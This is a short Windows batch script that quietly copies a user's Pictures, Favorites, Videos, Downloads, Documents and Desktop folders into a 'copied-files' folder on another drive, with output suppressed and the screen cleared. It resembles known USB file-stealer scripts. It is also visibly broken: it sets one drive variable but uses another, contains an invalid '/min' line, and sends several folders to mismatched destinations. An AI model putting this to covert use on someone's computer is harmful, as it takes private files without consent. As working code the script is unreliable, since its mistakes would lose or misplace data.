@echo off 
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\copied-files\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\copied-files\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\copied-files\vids"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\copied-files\Favorites"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\copied-files\docs"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\copied-files\down"

@echo off
cls